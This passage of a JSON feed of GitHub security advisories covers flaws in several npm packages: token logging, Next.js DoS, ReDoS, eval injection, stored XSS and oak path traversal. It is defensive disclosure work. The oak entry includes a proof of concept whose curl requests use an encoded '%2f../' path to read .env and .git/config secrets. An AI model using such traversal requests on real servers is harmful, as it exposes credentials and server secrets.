            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Refresh tokens are logged to the console when the disabled by default <code>debug</code> flag, is enabled.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Patched in <a href=\"https://github.com/workos/authkit-remix/releases/tag/v0.4.1\">https://github.com/workos/authkit-remix/releases/tag/v0.4.1</a></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/workos/authkit-remix/security/advisories/GHSA-v2qh-f584-6hj8\">https://github.com/workos/authkit-remix/security/advisories/GHSA-v2qh-f584-6hj8</a></li>\n<li><a href=\"https://github.com/workos/authkit-remix/commit/32d5bcd54c795c1e2a3204f8e3977ab9ad57ec06\">https://github.com/workos/authkit-remix/commit/32d5bcd54c795c1e2a3204f8e3977ab9ad57ec06</a></li>\n<li><a href=\"https://github.com/workos/authkit-remix/releases/tag/v0.4.1\">https://github.com/workos/authkit-remix/releases/tag/v0.4.1</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-51753\">https://nvd.nist.gov/vuln/detail/CVE-2024-51753</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-v2qh-f584-6hj8\">https://github.com/advisories/GHSA-v2qh-f584-6hj8</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-v2qh-f584-6hj8",
            "title": "[@workos-inc/authkit-remix] @workos-inc/authkit-remix refresh tokens are logged when the debug flag is enabled",
            "date_modified": "2024-11-05T21:37:21.000Z",
            "date_published": "2024-11-05T17:34:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-v2qh-f584-6hj8"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>Refresh tokens are logged to the console when the disabled by default <code>debug</code> flag, is enabled.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Patched in <a href=\"https://github.com/workos/authkit-nextjs/releases/tag/v0.13.2\">https://github.com/workos/authkit-nextjs/releases/tag/v0.13.2</a></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/workos/authkit-nextjs/security/advisories/GHSA-5wmg-9cvh-qw25\">https://github.com/workos/authkit-nextjs/security/advisories/GHSA-5wmg-9cvh-qw25</a></li>\n<li><a href=\"https://github.com/workos/authkit-nextjs/commit/15a332632f7560b03cc6d8cc8da24fd2ac931da7\">https://github.com/workos/authkit-nextjs/commit/15a332632f7560b03cc6d8cc8da24fd2ac931da7</a></li>\n<li><a href=\"https://github.com/workos/authkit-nextjs/releases/tag/v0.13.2\">https://github.com/workos/authkit-nextjs/releases/tag/v0.13.2</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-51752\">https://nvd.nist.gov/vuln/detail/CVE-2024-51752</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-5wmg-9cvh-qw25\">https://github.com/advisories/GHSA-5wmg-9cvh-qw25</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-5wmg-9cvh-qw25",
            "title": "[@workos-inc/authkit-nextjs] @workos-inc/authkit-nextjs refresh tokens are logged when the debug flag is enabled",
            "date_modified": "2024-11-05T21:37:25.000Z",
            "date_published": "2024-11-05T17:34:23.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-5wmg-9cvh-qw25"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>A Denial of Service (DoS) condition was identified in Next.js. Exploitation of the bug can trigger a crash, affecting the availability of the server.</p>\n<p><strong>This vulnerability can affect all Next.js deployments on the affected versions.</strong></p>\n<h3 id=\"patches\">Patches</h3>\n<p>This vulnerability was resolved in Next.js 13.5 and later. We recommend that users upgrade to a safe version.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>There are no official workarounds for this vulnerability.</p>\n<h4 id=\"credit\">Credit</h4>\n<ul>\n<li>Thai Vu of <a href=\"http://flyseccorp.com/\">flyseccorp.com</a></li>\n<li>Aonan Guan (@0dd), Senior Cloud Security Engineer</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vercel/next.js/security/advisories/GHSA-fq54-2j52-jc42\">https://github.com/vercel/next.js/security/advisories/GHSA-fq54-2j52-jc42</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-39693\">https://nvd.nist.gov/vuln/detail/CVE-2024-39693</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-fq54-2j52-jc42\">https://github.com/advisories/GHSA-fq54-2j52-jc42</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-fq54-2j52-jc42",
            "title": "[next] Next.js Denial of Service (DoS) condition",
            "date_modified": "2024-11-06T14:30:34.000Z",
            "date_published": "2024-07-10T16:03:06.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-fq54-2j52-jc42"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>A Regular Expression Denial of Service (ReDoS) flaw was found in kangax html-minifier 4.0.0 via the candidate variable in htmlminifier.js.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2022-37620\">https://nvd.nist.gov/vuln/detail/CVE-2022-37620</a></li>\n<li><a href=\"https://github.com/kangax/html-minifier/issues/1135\">https://github.com/kangax/html-minifier/issues/1135</a></li>\n<li><a href=\"https://github.com/kangax/html-minifier/blob/51ce10f4daedb1de483ffbcccecc41be1c873da2/src/htmlminifier.js#L1338\">https://github.com/kangax/html-minifier/blob/51ce10f4daedb1de483ffbcccecc41be1c873da2/src/htmlminifier.js#L1338</a></li>\n<li><a href=\"https://github.com/kangax/html-minifier/blob/51ce10f4daedb1de483ffbcccecc41be1c873da2/src/htmlminifier.js#L294\">https://github.com/kangax/html-minifier/blob/51ce10f4daedb1de483ffbcccecc41be1c873da2/src/htmlminifier.js#L294</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pfq8-rq6v-vf5m\">https://github.com/advisories/GHSA-pfq8-rq6v-vf5m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pfq8-rq6v-vf5m",
            "title": "[html-minifier] kangax html-minifier REDoS vulnerability",
            "date_modified": "2024-11-04T21:23:17.000Z",
            "date_published": "2022-10-31T19:00:36.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pfq8-rq6v-vf5m"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Versions of the package lilconfig from 3.1.0 and before 3.1.1 are vulnerable to Arbitrary Code Execution due to the insecure usage of eval in the dynamicImport function. An attacker can exploit this vulnerability by passing a malicious input through the defaultLoaders function.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-21537\">https://nvd.nist.gov/vuln/detail/CVE-2024-21537</a></li>\n<li><a href=\"https://github.com/antonk52/lilconfig/pull/48\">https://github.com/antonk52/lilconfig/pull/48</a></li>\n<li><a href=\"https://github.com/antonk52/lilconfig/commit/2c68a1ab8764fc74acc46771e1ad39ab07a9b0a7\">https://github.com/antonk52/lilconfig/commit/2c68a1ab8764fc74acc46771e1ad39ab07a9b0a7</a></li>\n<li><a href=\"https://github.com/antonk52/lilconfig/releases/tag/v3.1.1\">https://github.com/antonk52/lilconfig/releases/tag/v3.1.1</a></li>\n<li><a href=\"https://security.snyk.io/vuln/SNYK-JS-LILCONFIG-6263789\">https://security.snyk.io/vuln/SNYK-JS-LILCONFIG-6263789</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-fq9m-v26v-2m4f\">https://github.com/advisories/GHSA-fq9m-v26v-2m4f</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-fq9m-v26v-2m4f",
            "title": "[lilconfig] lilconfig Code Injection vulnerability",
            "date_modified": "2024-11-01T21:39:33.000Z",
            "date_published": "2024-10-31T06:30:45.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-fq9m-v26v-2m4f"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Glossarizer through 1.5.2 improperly tries to convert text into HTML. Even though the application itself escapes special characters (e.g., &lt;&gt;), the underlying library converts these encoded characters into legitimate HTML, thereby possibly causing stored XSS. Attackers can append a XSS payload to a word that has a corresponding glossary entry.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-42515\">https://nvd.nist.gov/vuln/detail/CVE-2024-42515</a></li>\n<li><a href=\"https://github.com/PebbleRoad/glossarizer\">https://github.com/PebbleRoad/glossarizer</a></li>\n<li><a href=\"https://herolab.usd.de/security-advisories/usd-2024-0011\">https://herolab.usd.de/security-advisories/usd-2024-0011</a></li>\n<li><a href=\"https://www.npmjs.com/package/glossarizer\">https://www.npmjs.com/package/glossarizer</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-hhhv-ggjx-q9j2\">https://github.com/advisories/GHSA-hhhv-ggjx-q9j2</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-hhhv-ggjx-q9j2",
            "title": "[glossarizer] Glossarizer Cross-site Scripting vulnerability",
            "date_modified": "2024-11-01T21:37:53.000Z",
            "date_published": "2024-10-31T21:31:45.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-hhhv-ggjx-q9j2"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>By default <code>oak</code> does not allow transferring of hidden files with <code>Context.send</code> API. However, this can be bypassed by\nencoding <code>/</code> as its URL encoded form <code>%2F</code>.</p>\n<h3 id=\"details\">Details</h3>\n<p>1.) Oak uses <a href=\"https://github.com/oakserver/oak/blob/3896fe568b25ac0b4c5afbf822ff8344c3d1712a/send.ts#L182C10-L182C25\">decodeComponent</a> which seems to be unexpected. This is also the reason why it is not possible to access a file that\ncontains URL encoded characters unless the client URL encodes it first.</p>\n<p>2.) The function <a href=\"https://github.com/oakserver/oak/blob/3896fe568b25ac0b4c5afbf822ff8344c3d1712a/send.ts#L117-L125\">isHidden</a> is flawed since it only checks if the first subpath is hidden, allowing secrets to be read from <code>subdir/.env</code>.</p>\n<h3 id=\"poc\">PoC</h3>\n<pre><code class=\"language-ts\">// server.ts\n\nimport { Application } from \"jsr:@oak/oak@17.1.2\";\n\nconst app = new Application();\n\napp.use(async (context, next) =&gt; {\n  try {\n    await context.send({\n      root: './root',\n      hidden: false, // default\n    });\n  } catch {\n    await next();\n  }\n});\n\nawait app.listen({ port: 8000 });\n</code></pre>\n<p>In terminal:</p>\n<pre><code class=\"language-bash\"># setup root directory\nmkdir root/.git\necho SECRET_KEY=oops &gt; root/.env\necho oops &gt;  root/.git/config\n\n# start server\ndeno run -A server.ts\n\n# in another terminal\ncurl -D- http://127.0.0.1:8000/poc%2f../.env\ncurl -D- http://127.0.0.1:8000/poc%2f../.git/config\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>For an attacker this has potential to read sensitive user data or to gain access to server secrets.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/oakserver/oak/security/advisories/GHSA-qm92-93fv-vh7m\">https://github.com/oakserver/oak/security/advisories/GHSA-qm92-93fv-vh7m</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-49770\">https://nvd.nist.gov/vuln/detail/CVE-2024-49770</a></li>\n<li><a href=\"https://github.com/oakserver/oak/commit/4b2f27efd5cba5a45b2c3982e610da3af0869209\">https://github.com/oakserver/oak/commit/4b2f27efd5cba5a45b2c3982e610da3af0869209</a></li>\n<li><a href=\"https://github.com/oakserver/oak/blob/3896fe568b25ac0b4c5afbf822ff8344c3d1712a/send.ts#L117-L125\">https://github.com/oakserver/oak/blob/3896fe568b25ac0b4c5afbf822ff8344c3d1712a/send.ts#L117-L125</a></li>\n<li><a href=\"https://github.com/oakserver/oak/blob/3896fe568b25ac0b4c5afbf822ff8344c3d1712a/send.ts#L182C10-L182C25\">https://github.com/oakserver/oak/blob/3896fe568b25ac0b4c5afbf822ff8344c3d1712a/send.ts#L182C10-L182C25</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-qm92-93fv-vh7m\">https://github.com/advisories/GHSA-qm92-93fv-vh7m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-qm92-93fv-vh7m",
            "title": "[@oakserver/oak] Path traversal in oak allows transfer of hidden files within the served root directory",
            "date_modified": "2024-11-01T21:37:13.000Z",
            "date_published": "2024-11-01T21:37:10.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-qm92-93fv-vh7m"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}